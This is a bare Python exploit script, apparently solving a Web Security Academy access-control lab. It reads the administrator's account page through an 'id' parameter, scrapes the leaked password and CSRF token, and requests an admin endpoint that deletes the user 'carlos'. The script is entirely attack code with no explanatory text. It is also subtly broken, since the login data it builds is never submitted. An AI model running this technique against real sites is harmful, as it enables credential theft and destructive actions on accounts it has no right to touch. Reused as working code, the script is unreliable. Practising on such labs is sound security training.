import requests, re 
from bs4 import BeautifulSoup

s = requests.Session()

site = 'ac111f591e6ef431c0e073bd00fe009e.web-security-academy.net'
url = f'https://{site}'
account_url = f'{url}/my-account?id=administrator'

resp = s.get(account_url, allow_redirects=False)
print(resp.text)
soup = BeautifulSoup(resp.text, 'html.parser')
admin_password = soup.find('input', {'name':'password'}).get('value')
csrf = soup.find('input', {'name':'csrf'}).get('value')

login_data = {
    'csrf' : csrf,
    'username' : 'administrator',
    'password' : admin_password
}

resp = s.get(f'{url}/admin/delete?username=carlos')
soup = BeautifulSoup(resp.text, 'html.parser')
print(soup)
